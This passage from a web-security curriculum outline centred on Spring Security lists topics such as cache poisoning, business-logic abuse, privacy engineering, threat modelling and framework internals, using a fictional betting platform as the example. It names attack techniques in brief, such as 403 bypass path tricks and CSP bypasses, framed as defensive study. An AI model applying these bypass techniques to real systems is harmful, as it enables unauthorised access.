       plus strict header validation is the fix. `[PROVE]` `[X-REF 10]`
2.21.3 **Web cache poisoning**: an unkeyed input (a header) influencing a cached response, so the
       attacker's payload is served to everyone. The cache-key discipline and `Vary`. `[ATTACK]`
       `[X-REF 15]`
2.21.4 **Web cache deception**: a path that the cache treats as static and the app treats as
       dynamic, so an authenticated response lands in a shared cache. The delimiter/extension
       mechanics and the fixes. `[ATTACK]` `[PROVE]` `[RESEARCH]`
2.21.5 **Host header attacks**: password-reset poisoning, cache poisoning, routing-based SSRF, and
       the fix — a configured canonical host and an allowlist of `Host` values. `[ATTACK]`
2.21.6 **HTTP response splitting** (from § 2.9.14) and the header-injection surfaces in a Java
       stack.
2.21.7 **`X-Forwarded-For` spoofing** and the trusted-proxy-count rule (`ForwardedHeaderFilter`,
       `server.forward-headers-strategy`, Tomcat's `RemoteIpValve` with `internalProxies`) — get
       this wrong and every IP-based control is bypassable. `[API]` `[NUM]` `[ATTACK]`
2.21.8 **403/401 bypass techniques** as a checklist to defend against: path casing, trailing slash,
       `..;/`, `%2e`, path parameters, `X-Original-URL`/`X-Rewrite-URL`, method override, and HTTP
       version differences. Why normalisation must happen once, before authorization. `[ATTACK]`
       `[PROVE]`
2.21.9 Spring Security's `HttpFirewall` / `StrictHttpFirewall` as the component that rejects these
       requests before matching: what it blocks by default (encoded slashes, semicolons, control
       characters, non-normalised paths) and the danger of relaxing it. `[API]` `[SOURCE]`
       `[TRAP]`
2.21.10 **Range** and `Content-Range` handling bugs, and range-based DoS. `[RESEARCH]`
2.21.11 **`TRACE`** and cross-site tracing; `OPTIONS` information disclosure. `[NUM]`
2.21.12 HTTP/2-specific DoS: rapid reset (CVE-2023-44487), CONTINUATION flood, and settings floods
        — with the mitigation knobs. `[CVE]` `[X-REF 10]` `[RESEARCH]`
2.21.13 Slowloris and slow-body attacks, and the server-side timeout knobs that stop them.
        `[NUM]`
2.21.14 GraphQL-specific abuse: batching to bypass rate limits, introspection in production, alias
        amplification, and depth/complexity limits. `[ATTACK]` `[X-REF 12]` `[RESEARCH]`

*(14 leaves)*

## §2.22 Business logic, concurrency and abuse

2.22.1 Business-logic vulnerabilities as the class no scanner finds: the request is well-formed and
       authorized, and the *sequence* or the *arithmetic* is wrong. Why testing them requires
       domain knowledge, which is why interviewers like the topic. `[PROVE]`
2.22.2 The catalogue, each with a QuizStakes instance: skipping a step in the onboarding state
       machine (`AO-*` → `AA-*`), replaying a `SettleStake`, negative or zero amounts, currency
       and rounding manipulation, coupon reuse for the 10%/cap-100 bonus, withdrawing bonus money
       that is stakeable-but-not-withdrawable, price/amount tampering on the client, and using a
       void to reverse a loss. `[TABLE]` `[ATTACK]` `[SOURCE]`
2.22.3 **State-machine enforcement** as the defence: transitions validated server-side against the
       current persisted state, not against a client-supplied "step". `[PROVE]` `[BUILD]`
2.22.4 **Invariant enforcement at the lowest possible layer**: money is neither created nor
       destroyed, so the ledger enforces it with constraints and a transaction, not the service
       layer with an `if`. `[PROVE]` `[SOURCE]` `[X-REF 09]`
2.22.5 **Race conditions as security bugs**: the classic double-spend on a balance check followed by
       a debit, and the concurrency-window exploitation technique (single-packet attack /
       last-byte synchronisation). `[ATTACK]` `[PROVE]` `[X-REF 05]`
2.22.6 The fixes, ranked: a single atomic statement (`UPDATE ... WHERE balance >= ?`), pessimistic
       locking, optimistic locking with `@Version`, a unique constraint as a correctness backstop,
       and idempotency keys. `[TABLE]` `[API]` `[X-REF 08]` `[X-REF 09]`
2.22.7 **TOCTOU** generally, with the SSRF-validation instance from § 2.10.11 and the
       file-check-then-open instance. `[PROVE]`
2.22.8 **Idempotency as a security property**: replaying a `POST /deposits` must not double-credit.
       The `Idempotency-Key` contract and the stored-response mechanism. `[X-REF 12]`
2.22.9 Numeric hazards that become money bugs: integer overflow, `double` for currency,
       `BigDecimal` scale and rounding mode, negative amounts, and the sign check that was only in
       the UI. `[NUM]` `[X-REF 03]`
2.22.10 Multi-accounting and identity linking as an abuse control, and its privacy cost.
2.22.11 The QuizStakes self-exclusion path as the highest-stakes logic in the domain: a hard 500 ms
        budget, must be immediate and irreversible, must propagate to every path that can create
        exposure, and must fail closed. Design it end to end. `[SOURCE]` `[NUM]` `[BUILD]`
2.22.12 How to *test* business-logic security: invariant/property tests, state-machine model tests,
        concurrency tests, and an explicit abuse-case list written next to the user stories.
        `[X-REF 16]`

*(12 leaves)*

## §2.23 Privacy and data protection as engineering work

2.23.1 The data-classification step nobody does: enumerate what you store, its sensitivity, its
       lawful basis, its retention, and where it flows. Without it, every other control is
       unaimed. `[TABLE]`
2.23.2 Data minimisation and purpose limitation as design constraints, with the QuizStakes
       onboarding example (employment and income data for affordability scoring — collected once,
       retained how long, visible to whom). `[SOURCE]`
2.23.3 PII in logs, analytics, error trackers, LLM prompts and support tools as the four leaks
       nobody models. `[TRAP]`
2.23.4 Pseudonymisation vs anonymisation vs de-identification, and the re-identification risk that
       makes the distinction real. `[PROVE]`
2.23.5 The GDPR rights that need an engineering implementation: access/portability (export),
       erasure (and the ledger's immutability conflict), rectification, and consent withdrawal.
       How to satisfy erasure when the audit trail must persist. `[PROVE]` `[SOURCE]`
2.23.6 Breach notification as an engineering dependency: you cannot report scope in 72 hours if you
       do not have the logs. `[NUM]` `[PROVE]`
2.23.7 Data residency and cross-border transfer as an architectural constraint. `[X-REF 18]`
2.23.8 PCI-DSS's practical effect on design: card data out of scope via a PSP, tokenization, and
       what "we never touch the PAN" actually requires. `[RESEARCH]`
2.23.9 Third-party data processors and the vendor-risk question, including the QuizStakes
       document-verification vendor. `[SOURCE]`
2.23.10 Privacy threat modelling with **LINDDUN** as the complement to STRIDE. `[RESEARCH]`

*(10 leaves)*

## §2.24 Spring Security — the configuration surface in anger

2.24.1 Multiple `SecurityFilterChain` beans: `@Order`, `securityMatcher`, the first-match-wins rule,
       and the canonical two-chain split (a stateless `/api/**` chain and a session-based
       `/operator/**` chain) — exactly the QuizStakes client/operator split. `[API]` `[BUILD]`
2.24.2 The `ignoring`/`permitAll` decision for static resources and health endpoints, and why
       `WebSecurityCustomizer.ignoring()` is a bigger hammer than it looks (it skips the whole
       chain, including headers). `[API]` `[TRAP]`
2.24.3 `formLogin` configuration: `loginPage`, `loginProcessingUrl`, `successHandler`,
       `failureHandler`, `defaultSuccessUrl` vs `successForwardUrl`, and the open-redirect risk in
       a `redirect` parameter. `[API]` `[ATTACK]`
2.24.4 `httpBasic` and when it is acceptable (a machine client over TLS behind a gateway).
2.24.5 `oauth2ResourceServer(jwt)` vs `oauth2ResourceServer(opaqueToken)` configuration end to end,
       including `jwkSetUri`, `issuer-uri` and the multi-tenant
       `JwtIssuerAuthenticationManagerResolver`. `[API]`
2.24.6 Authority mapping: `JwtGrantedAuthoritiesConverter`'s `SCOPE_` prefix, mapping a custom
       `roles` claim, and the trap of trusting a claim the AS lets the client set. `[API]`
       `[TRAP]`
2.24.7 `sessionManagement`: `sessionCreationPolicy`, `sessionFixation`, `maximumSessions`,
       `invalidSessionUrl`, `sessionAuthenticationStrategy`. `[API]`
2.24.8 `exceptionHandling`: `authenticationEntryPoint`, `accessDeniedHandler`, and returning
       `ProblemDetail` JSON instead of an HTML login redirect for an API — the single most common
       "why do I get a 302 instead of a 401" question. `[API]` `[TRAP]`
2.24.9 `logout`: `logoutUrl`, `logoutSuccessHandler`, `deleteCookies`, `invalidateHttpSession`,
       `clearAuthentication`, `addLogoutHandler`, and CSRF on logout. `[API]`
2.24.10 A custom authentication filter done correctly: extend `AbstractAuthenticationProcessingFilter`
        or `OncePerRequestFilter`, where to place it (`addFilterBefore`), and the
        `SecurityContextHolder` + `SecurityContextRepository` save that people forget. `[API]`
        `[BUILD]`
2.24.11 A custom `AuthenticationProvider` and `UserDetailsService`, including the
        **user-not-found timing** requirement (`hideUserNotFoundExceptions`) and the dummy-hash
        trick. `[API]` `[PROVE]`
2.24.12 Reactive/WebFlux differences: `SecurityWebFilterChain`, `ReactiveSecurityContextHolder`,
        `@EnableWebFluxSecurity`, and why the `ThreadLocal` model does not apply. `[API]`
2.24.13 Servlet vs `@Async` vs virtual-thread context propagation (from § 2.8.14) as a Spring
        Security concern. `[X-REF 05]`
2.24.14 `spring-security-test`: `@WithMockUser`, `@WithUserDetails`, `@WithSecurityContext`,
        `SecurityMockMvcRequestPostProcessors.csrf()`, `jwt()`, `oidcLogin()`,
        `SecurityMockMvcResultMatchers`, and the negative tests that actually prove authorization.
        `[API]` `[X-REF 16]`
2.24.15 Debugging Spring Security: `logging.level.org.springframework.security=DEBUG`,
        `@EnableWebSecurity(debug = true)`, the filter-chain log line at startup, and reading it.
        `[API]` `[DIAG]`
2.24.16 The Spring Security 6 → 7 migration checklist as a single actionable list. `[TABLE]`
        `[VERSION-TRAP]` `[RESEARCH]`
2.24.17 Common Spring Security misconfigurations, as a catalogue: CSRF disabled on a session app,
        `permitAll` before the specific rule, `.ignoring()` on an authenticated path, headers
        disabled to fix one embed, `sessionCreationPolicy(STATELESS)` with `formLogin`, a permissive
        CORS bean overriding the security config, `@PreAuthorize` on a non-proxied call, and
        `hasRole("ROLE_X")`. `[TABLE]` `[TRAP]`

*(17 leaves)*

## §2.25 Threat modelling

2.25.1 The **four questions** (Threat Modeling Manifesto): what are we working on, what can go
       wrong, what are we going to do about it, did we do a good job. Everything else is technique.
       `[SOURCE]` `[PROVE]`
2.25.2 The artifact: a **data-flow diagram** with processes, data stores, external entities, flows
       and **trust boundaries** — and the observation that almost every interesting threat lives on
       a boundary. `[PROVE]`
2.25.3 **STRIDE**, all six, with the QuizStakes instance and the standard mitigation category for
       each: Spoofing→authentication, Tampering→integrity, Repudiation→audit,
       Information disclosure→confidentiality, Denial of service→availability,
       Elevation of privilege→authorization. `[TABLE]`
2.25.4 STRIDE-per-element vs STRIDE-per-interaction, and why per-interaction finds more.
2.25.5 **Attack trees**: the attacker's goal at the root, decomposed through OR/AND nodes — the tool
       when you need depth on one objective (for QuizStakes: "withdraw money that is not mine").
       `[BUILD]`
2.25.6 **DREAD** and why it fell out of use (unstable, subjective scores), and what teams use
       instead (likelihood × impact against a documented scale, or just ranking).
       `[VERSION-TRAP]`
2.25.7 Other methodologies named so you can place them: PASTA, OCTAVE, Trike, VAST, LINDDUN
       (privacy), MITRE ATT&CK and the kill chain (operations rather than design).
       `[TABLE]`
2.25.8 The **abuse case / evil user story** as the lightweight version that fits a sprint.
2.25.9 Who is in the room, how long it takes, and what the output is: a threat list with an owner
       and a decision (mitigate / eliminate / transfer / accept) per threat. `[FLOW]` `[TABLE]`
2.25.10 When to threat model: at design, at a boundary change, at a new integration, and after an
        incident. Not annually.
2.25.11 A worked threat model of the QuizStakes deposit flow end to end — the DFD, the boundaries
        (browser→`ApplicationGateway`, gateway→`PaymentService`, `PaymentService`→PSP,
        PSP→`BDP-*` webhook, `PaymentService`→`FundsLedger`), the STRIDE pass, and the
        prioritised mitigation list. This is the section's deliverable. `[BUILD]` `[TABLE]`
        `[SOURCE]`
2.25.12 Tooling: OWASP Threat Dragon, pytm, IriusRisk, and the honest note that a whiteboard photo
        in the design doc beats an unused tool. `[RESEARCH]`
2.25.13 Security requirements that fall out of a threat model, written as testable statements — the
        bridge from threat modelling to `16-testing.md`. `[X-REF 16]`

*(13 leaves)*

## §2.26 Secure SDLC and security testing

2.26.1 The pipeline as a sequence of gates, each with what it catches and what it cannot: design
       review/threat model → secure defaults in the framework → linters and secret scanning at
       commit → SAST → SCA → build provenance → DAST/IAST in staging → pentest → bug bounty →
       runtime detection. `[TABLE]` `[PROVE]`
2.26.2 **SAST**: how it works (dataflow/taint analysis over an AST or IR), what it is good at
       (injection, hardcoded secrets, unsafe APIs), what it cannot see (authorization logic,
       business logic), and the false-positive economics that determine whether anyone reads it.
       Tools: SpotBugs + find-sec-bugs, Semgrep, CodeQL, SonarQube, Snyk Code. `[TABLE]` `[PROVE]`
2.26.3 **DAST**: black-box scanning of a running app; good at reflected issues and
       misconfiguration, blind to authorization and logic; needs authentication and a crawl
       strategy. Tools: ZAP, Burp Suite. `[TABLE]`
2.26.4 **IAST** and **RASP** in one leaf each, with an honest assessment of their adoption.
2.26.5 **SCA** and reachability, cross-referencing § 2.18.11.
2.26.6 **Secret scanning** at three points: pre-commit, CI, and the platform's push protection.
2.26.7 **IaC and container scanning**: Checkov/tfsec/Trivy, and the shift of misconfiguration into
       code where it can be gated. `[X-REF 19]`
2.26.8 **Fuzzing**: coverage-guided fuzzing of parsers and deserializers, Jazzer/OSS-Fuzz for the
       JVM, and property-based testing as its accessible cousin. `[X-REF 16]` `[RESEARCH]`
2.26.9 **Security unit and integration tests** you should actually write: an authorization matrix
       test, a CSRF-required test, a security-headers assertion, a "no PII in logs" test, a
       parameterized-query test, an SSRF-allowlist test, and a rate-limit test. `[BUILD]`
       `[X-REF 16]`
2.26.10 **Penetration testing**: scoping (the questions to ask), black/grey/white box, the
        engagement lifecycle, and how to read a report (severity inflation, duplicate findings,
        "informational" items that matter). `[FLOW]` `[RESEARCH]`
2.26.11 **Bug bounty / VDP**: when a program is appropriate, triage cost, duplicate handling, and
        the `SECURITY.md` minimum.
2.26.12 **Red team / purple team / tabletop exercises** and what each validates.
2.26.13 The **CI gate policy** that survives contact with delivery pressure: block on new critical
        findings in changed code, warn on the rest, track debt with an owner and a date, and never
        gate on a total count. `[PROVE]`
2.26.14 **Security champions**, design-review checklists, and the organisational answer to "the
        security team is two people and there are forty engineers". `[RESEARCH]`
2.26.15 **OWASP SAMM** and maturity models: useful as a gap analysis, dangerous as a target.
2.26.16 Security in code review — the concrete checklist a reviewer can apply in five minutes:
        does this touch auth, does it take user input into a query/template/URL/file path, does it
        add a dependency, does it log something new, does it change a default. `[TABLE]` `[BUILD]`

*(16 leaves)*

## §2.27 Choosing — the decision procedures

2.27.1 Session vs token, as a flow with the four questions that decide it. `[FLOW]`
2.27.2 Where to put the token in a browser app, as a flow. `[FLOW]`
2.27.3 Which OAuth flow, as a flow. `[FLOW]`
2.27.4 Symmetric vs asymmetric token signing, as a flow. `[FLOW]`
2.27.5 Bearer vs sender-constrained (DPoP vs mTLS), as a flow. `[FLOW]`
2.27.6 RBAC vs ABAC vs ReBAC, and in-app vs externalised policy, as a flow against the 30 ms
      budget. `[FLOW]` `[NUM]`
2.27.7 Where to enforce a rate limit and on what key, as a flow. `[FLOW]`
2.27.8 CSRF strategy for a given app shape, as a flow. `[FLOW]`
2.27.9 Encrypt vs hash vs tokenize vs redact for a given field, as a flow. `[FLOW]`
2.27.10 Build vs buy for identity (Keycloak/Auth0/Okta/Cognito vs Spring Authorization Server), as a
        flow with the real cost drivers. `[FLOW]` `[TABLE]`
2.27.11 When *not* to add a control: the cost, the false-confidence risk, and the maintenance
        burden. Name three controls commonly added that are not worth it. `[PROVE]`
2.27.12 How to answer "is this secure enough?" — the threat model, the residual risk, the detection
        story, and the decision record. `[PROVE]`

*(12 leaves)*

**PART 2 total: 463 leaves.**

---

# PART 3 — UNDER THE HOOD

## §3.1 The origin and same-origin algorithms, precisely

3.1.1 URL parsing per the WHATWG URL Standard, and the fields the origin is derived from — plus
      the fact that different parsers (browser, Java `URI`, Java `URL`, `HttpClient`, a WAF regex)
      disagree, which is the root of the parser-confusion attack class. `[SPEC]` `[PROVE]`
3.1.2 The "origin of a URL" algorithm: tuple origins for `http`/`https`/`ws`/`wss`/`ftp`, opaque
      origins for `data:`, `about:blank` inheriting, `blob:` inheriting, and `file:`'s
      implementation-defined behaviour. `[SPEC]` `[SOURCE]`
3.1.3 The "same origin" and "same origin-domain" comparison algorithms as HTML defines them, and
      why the second exists (the legacy `document.domain` path). `[SPEC]`
3.1.4 The **registrable domain / same-site** algorithm: obtain the public suffix from the PSL, take
      one more label, compare; plus **schemeful** same-site. Worked examples on
      `quizstakes.example`, `ops.quizstakes.example` and `quizstakes.example.co.uk`. `[SPEC]`
      `[PROVE]`
3.1.5 **Agent clusters** and origin-keyed agent clusters (`Origin-Agent-Cluster`) as the modern
      replacement for `document.domain`, and their relation to process isolation. `[SPEC]`
      `[RESEARCH]`
3.1.6 What "site for cookies" means for a nested browsing context — the ancestor chain must *all*
      be same-site, which is why an attacker-framed page cannot launder a `SameSite=Lax` cookie.
      `[SPEC]` `[PROVE]`
3.1.7 How the browser actually decides to hand a response to script: the response's **type**
      (`basic`, `cors`, `opaque`, `opaqueredirect`, `error`) from Fetch, and the fact that a
      cross-origin `no-cors` fetch resolves with an opaque response — the request succeeded and you
      cannot read it. `[SPEC]` `[PROVE]`
3.1.8 **Opaque responses and CORB/ORB**: the browser refusing to even deliver a cross-origin
      HTML/JSON body into an image/script context, as a Spectre mitigation. `[RESEARCH]`

*(8 leaves)*

## §3.2 The CORS protocol as an algorithm

3.2.1 The Fetch CORS-preflight-fetch algorithm, step by step: when a preflight is required, what
      the `OPTIONS` request contains, and what makes the response acceptable. `[SPEC]` `[FLOW]`
3.2.2 The **CORS check** algorithm: read `Access-Control-Allow-Origin`, handle `*` vs an exact
      origin, apply the credentials-mode rule, and fail otherwise. `[SPEC]` `[SOURCE]`
3.2.3 The **CORS-safelisted request-header** algorithm including the value-length limit (128 bytes
      for `Content-Type` etc.) and the `Range` restriction — the details that explain why a header
      you thought was safelisted triggers a preflight. `[SPEC]` `[NUM]`
3.2.4 The **forbidden request headers** the browser will not let script set (`Cookie`, `Host`,
      `Origin`, `Referer`, `Sec-*`, `Proxy-*`, `Connection`, `Content-Length`), and why that list is
      what makes `Sec-Fetch-*` trustworthy. `[SPEC]` `[PROVE]`
3.2.5 The preflight cache: keyed by (origin, url, credentials, method, header name),
      `Access-Control-Max-Age` and its browser-imposed ceilings. `[NUM]` `[SPEC]`
3.2.6 Redirects during a CORS request and during a preflight, and why a preflight must not redirect.
      `[SPEC]`
3.2.7 Spring's implementation walk: `CorsFilter` → `CorsProcessor`/`DefaultCorsProcessor` →
      `CorsConfiguration.checkOrigin/checkHttpMethod/checkHeaders`, `combine()` semantics, and
      `AbstractHandlerMapping`'s `CorsConfigurationSource`. `[SOURCE]` `[API]`
3.2.8 Why Spring Security's `CorsFilter` placement matters, traced through the chain: the preflight
      carries no credentials, so if authentication runs first it gets a 401 and the browser reports
      a CORS error. `[PROVE]` `[FLOW]` `[TRAP]`

*(8 leaves)*

## §3.3 Cookies as an algorithm

3.3.1 The cookie store as a data structure: the fields per entry (name, value, expiry-time,
      domain, path, creation-time, last-access-time, persistent-flag, host-only-flag, secure-only-
      flag, http-only-flag, same-site-flag) and why they matter. `[SPEC]` `[SOURCE]`
3.3.2 The **storage model** algorithm: parsing `Set-Cookie`, the public-suffix rejection rule, the
      host-only determination, the default-path computation, and eviction. `[SPEC]` `[FLOW]`
3.3.3 The **retrieval** algorithm: domain-match, path-match, secure-only, http-only, same-site
      filtering, then sort by path length then creation time. `[SPEC]` `[FLOW]`
3.3.4 The **domain-matching** algorithm verbatim, including the "identical, or a suffix preceded by
      a dot and not an IP" rule. `[SPEC]` `[SOURCE]`
3.3.5 The **path-matching** algorithm verbatim, and the prefix subtlety that makes `/api` match
      `/apifoo` or not. `[SPEC]` `[NUM]`
3.3.6 The prefix-enforcement algorithm for `__Secure-` and `__Host-`, and the case-insensitive
      matching change. `[SPEC]` `[VERSION-TRAP]`
3.3.7 The same-site determination for a request: the "site for cookies" of the client, the
      top-level-navigation carve-out, and the reload exclusion. `[SPEC]` `[PROVE]`
3.3.8 Why the spec says cookies have **no integrity** and the server cannot see the attributes it
      set — and therefore why prefixes are the only server-verifiable signal. `[SOURCE]` `[PROVE]`
3.3.9 Servlet/Tomcat cookie handling internals: `Cookie` vs `ResponseCookie`, the `SameSite`
      support history, `CookieProcessor`/`Rfc6265CookieProcessor`, and why Spring's
      `CookieSerializer` exists. `[API]` `[VERSION-TRAP]`

*(9 leaves)*

## §3.4 CSP enforcement internals

3.4.1 The policy data model: a list of policies, each a list of directives, each with a source
      list; and the **intersection** semantics of multiple policies (all must allow). `[SPEC]`
      `[PROVE]`
3.4.2 The fetch-directive fallback chain: `script-src-elem`/`script-src-attr` → `script-src` →
      `default-src`; the directives `default-src` does **not** cover (`base-uri`, `form-action`,
      `frame-ancestors`, `sandbox`, `report-to`). `[SPEC]` `[TABLE]` `[TRAP]`
3.4.3 The **should-block-inline** algorithm: nonce match, hash match, `'unsafe-inline'`, and how
      `'strict-dynamic'` changes it. `[SPEC]` `[FLOW]`
3.4.4 The **source-expression matching** algorithm: scheme matching (including the `http:` matches
      `https:` upgrade rule), host wildcards, port defaults, and path matching's trailing-slash
      rule. `[SPEC]` `[NUM]`
3.4.5 Why nonces must be unpredictable **per response** and why caching an HTML page with a nonce
      breaks the policy silently. `[PROVE]`
3.4.6 The `'strict-dynamic'` propagation mechanism: parser-inserted vs script-inserted scripts, and
      the exact reason allowlists are ignored. `[SPEC]` `[PROVE]`
3.4.7 The violation report object's fields (`document-uri`, `referrer`, `blocked-uri`,
      `violated-directive`/`effective-directive`, `original-policy`, `disposition`,
      `status-code`, `script-sample`, `line-number`) and the `Reporting-Endpoints` delivery.
      `[WIRE]` `[SPEC]`
3.4.8 Known CSP bypass mechanics: a JSONP endpoint on an allowlisted host, an Angular/AngularJS
      template on an allowlisted host, `base-uri` omission redirecting relative script URLs, a
      permissive `object-src`, and dangling-markup exfiltration. `[ATTACK]` `[PROVE]`
3.4.9 What CSP fundamentally cannot stop: exfiltration to an allowed destination, DOM manipulation
      and UI redressing by injected markup, and same-origin data reads. `[PROVE]`
3.4.10 Trusted Types enforcement internals: the sink-type mapping, `trustedTypes.createPolicy`, the
       `default` policy, and the report-only rollout path. `[SPEC]` `[RESEARCH]`

*(10 leaves)*

## §3.5 Spring Security internals

3.5.1 Bootstrap: `SecurityAutoConfiguration`, `SecurityFilterAutoConfiguration`,
      `SpringBootWebSecurityConfiguration`'s `defaultSecurityFilterChain`, the
      `securityFilterChainRegistration` with order `-100`, and `WebSecurityConfiguration` building
      the `FilterChainProxy` bean named `springSecurityFilterChain`. `[SOURCE]` `[API]` `[NUM]`
3.5.2 `DelegatingFilterProxy.doFilter` traced: lazy bean lookup, `initFilterBean`, and the
      `targetFilterLifecycle` flag. `[SOURCE]`
3.5.3 `FilterChainProxy.doFilter` traced: the `VirtualFilterChain`, `getFilters(request)` returning
      the first matching chain, `firewall.getFirewalledRequest`, and the `finally` that clears the
      `SecurityContextHolder`. Why that `finally` is a correctness requirement on a pooled thread.
      `[SOURCE]` `[PROVE]`
3.5.4 **The default filter order, enumerated with each filter's job** (Spring Security 6.5/7.x):
      `DisableEncodeUrlFilter`, `WebAsyncManagerIntegrationFilter`, `SecurityContextHolderFilter`,
      `HeaderWriterFilter`, `CorsFilter`, `CsrfFilter`, `LogoutFilter`,
      `OAuth2AuthorizationRequestRedirectFilter`, `Saml2WebSsoAuthenticationRequestFilter`,
      `X509AuthenticationFilter`, `AbstractPreAuthenticatedProcessingFilter`, `CasAuthenticationFilter`,
      `OAuth2LoginAuthenticationFilter`, `Saml2WebSsoAuthenticationFilter`,
      `UsernamePasswordAuthenticationFilter`, `DefaultLoginPageGeneratingFilter`,
      `DefaultLogoutPageGeneratingFilter`, `ConcurrentSessionFilter`, `DigestAuthenticationFilter`,
      `BearerTokenAuthenticationFilter`, `BasicAuthenticationFilter`, `RequestCacheAwareFilter`,
      `SecurityContextHolderAwareRequestFilter`, `JaasApiIntegrationFilter`,
      `RememberMeAuthenticationFilter`, `AnonymousAuthenticationFilter`,
      `OAuth2AuthorizationCodeGrantFilter`, `SessionManagementFilter`, `ExceptionTranslationFilter`,
      `AuthorizationFilter`. Verify against `FilterOrderRegistration`. `[SOURCE]` `[TABLE]`
      `[NUM]` `[RESEARCH]`
3.5.5 Why the order is what it is: headers before anything can commit a response, CORS before
      authentication, CSRF before state change, authentication before authorization, exception
      translation wrapping authorization. Prove that any reordering breaks something. `[PROVE]`
3.5.6 `SecurityContextHolder` strategies: `MODE_THREADLOCAL` (default),
      `MODE_INHERITABLETHREADLOCAL`, `MODE_GLOBAL`, the `SecurityContextHolderStrategy` indirection
      added in 5.8, and the behaviour under virtual threads. `[API]` `[SOURCE]` `[X-REF 05]`
3.5.7 `SecurityContextHolderFilter` vs the removed `SecurityContextPersistenceFilter`: explicit
      saving via `SecurityContextRepository.saveContext` is now required, which is exactly why a
      custom filter's authentication silently vanishes on the next request. `[VERSION-TRAP]`
      `[TRAP]` `[PROVE]`
3.5.8 `ProviderManager.authenticate` traced: iterate providers, `supports`, first non-null result
      wins, `eraseCredentials`, parent delegation, and the event publishing
      (`AuthenticationSuccessEvent` / `AbstractAuthenticationFailureEvent`). `[SOURCE]`
3.5.9 `DaoAuthenticationProvider` traced, including `mitigateAgainstTimingAttack` — the deliberate
      dummy-password hash when the user does not exist. Quote it; it is the canonical example of a
      timing-attack mitigation in a mainstream framework. `[SOURCE]` `[PROVE]`
3.5.10 `AuthorizationFilter` → `AuthorizationManager.verify` → `RequestMatcherDelegatingAuthorizationManager`,
       and how the DSL's matcher list becomes that structure. `[SOURCE]`
3.5.11 Method security internals: `AuthorizationManagerBeforeMethodInterceptor` /
       `...AfterMethodInterceptor`, `PreAuthorizeAuthorizationManager`,
       `MethodSecurityExpressionHandler`, the `SecurityExpressionRoot` hierarchy, the pointcut, the
       `Advisor` order relative to `@Transactional`, and the proxy-vs-AspectJ choice. `[SOURCE]`
       `[API]` `[X-REF 07]`
3.5.12 `CsrfFilter.doFilterInternal` traced: `DeferredCsrfToken`, the `Supplier<CsrfToken>` handed
       to the request handler, `requireCsrfProtectionMatcher` (the safe-method set),
       `csrfTokenRequestHandler.resolveCsrfTokenValue`, the `equalsConstantTime` comparison, and
       the `AccessDeniedException` path. `[SOURCE]` `[FLOW]`
3.5.13 `XorCsrfTokenRequestAttributeHandler`'s mechanism: a random mask XORed with the token and
       prefixed, so the rendered value differs per response — the **BREACH** mitigation — and the
       consequence that a client cannot cache the token value. `[SOURCE]` `[PROVE]`
       `[VERSION-TRAP]`
3.5.14 `CookieCsrfTokenRepository` internals and why `withHttpOnlyFalse()` is required for a
       JS-reading SPA, plus what `csrf().spa()` composes in 7.0. `[API]` `[RESEARCH]`
3.5.15 `HeaderWriterFilter` and the `HeaderWriter` implementations
       (`HstsHeaderWriter`, `XFrameOptionsHeaderWriter`, `XContentTypeOptionsHeaderWriter`,
       `ContentSecurityPolicyHeaderWriter`, `ReferrerPolicyHeaderWriter`,
       `CacheControlHeadersWriter`, `CrossOriginOpenerPolicyHeaderWriter`,
       `PermissionsPolicyHeaderWriter`), and the exact default header set Spring Security writes.
       `[SOURCE]` `[NUM]`
3.5.16 `StrictHttpFirewall` internals: the rejected patterns (`//`, `./`, `../`, `;`, `%2e`,
       `%2f`, `%5c`, control characters, non-ASCII, non-printable), the allowed-method list, the
       header-name/value validation, and `RequestRejectedException`'s handling. `[SOURCE]`
       `[NUM]` `[PROVE]`
3.5.17 `ExceptionTranslationFilter` internals: the `try/catch` around the chain, the
       `AuthenticationTrustResolver` deciding whether an `AccessDeniedException` on an anonymous
       principal becomes a 401 instead of a 403, the `RequestCache` save, and the entry-point
       invocation. This is the mechanism behind "why do I get a login redirect from my API".
       `[SOURCE]` `[PROVE]` `[TRAP]`
3.5.18 Session-fixation internals: `SessionFixationProtectionStrategy`,
       `ChangeSessionIdAuthenticationStrategy`, `CompositeSessionAuthenticationStrategy`, and what
       gets copied. `[SOURCE]`
3.5.19 `ConcurrentSessionControlAuthenticationStrategy` + `SessionRegistry` +
       `ConcurrentSessionFilter` + `HttpSessionEventPublisher` — and why concurrent-session control
       silently does nothing without the publisher. `[API]` `[TRAP]`
3.5.20 Remember-me internals: `TokenBasedRememberMeServices`'s cookie format
       (`username:expiry:signature`) and `PersistentTokenBasedRememberMeServices`'s series/token
       rotation with theft detection. `[SOURCE]` `[PROVE]`
3.5.21 OAuth2 client internals: `OAuth2AuthorizationRequestRedirectFilter`,
       `AuthorizationRequestRepository` (the `state`/PKCE store),
       `OAuth2LoginAuthenticationProvider`, `OAuth2AuthorizationCodeGrantFilter`,
       `DefaultAuthorizationCodeTokenResponseClient`, `OAuth2AuthorizedClientManager`'s provider
       chain, and the `ClientRegistration` model. `[SOURCE]` `[API]`
3.5.22 Resource-server internals: `BearerTokenAuthenticationFilter` →
       `BearerTokenAuthenticationConverter` → `JwtAuthenticationProvider` → `NimbusJwtDecoder` →
       `JWTProcessor`/`JWSKeySelector`/`RemoteJWKSet` with its cache, then
       `OAuth2TokenValidator` chain, then `JwtAuthenticationConverter`. Where the algorithm is
       pinned. `[SOURCE]` `[PROVE]`
3.5.23 `PasswordEncoder` implementations and their stored formats: `BCryptPasswordEncoder`
       (`$2a$10$...`), `Argon2PasswordEncoder`, `SCryptPasswordEncoder`,
       `Pbkdf2PasswordEncoder`, `DelegatingPasswordEncoder`'s `{id}` prefix,
       `NoOpPasswordEncoder` (deprecated for a reason), and `upgradeEncoding`. `[SOURCE]` `[NUM]`
3.5.24 The events Spring Security publishes and why they are the cheapest security telemetry you
       will ever add: `AuthenticationSuccessEvent`, `AuthenticationFailureBadCredentialsEvent` (and
       the rest of the failure hierarchy), `AuthorizationDeniedEvent`,
       `SessionFixationProtectionEvent`, `LogoutSuccessEvent`, `SessionDestroyedEvent`. `[API]`
       `[X-REF 20]`

*(24 leaves)*

## §3.6 Password hashing internals

3.6.1 **bcrypt** internals: the Blowfish-derived `EksBlowfish` key schedule, the cost parameter as
      `2^cost` key-setup rounds, the 128-bit salt, the 192-bit output, and the modular-crypt output
      format `$2b$<cost>$<22-char salt><31-char hash>`. `[NUM]` `[SPEC]` `[PROVE]`
3.6.2 The `$2a$`/`$2b$`/`$2x$`/`$2y$` version prefixes and the historical sign-extension bug they
      encode. `[NUM]` `[RESEARCH]`
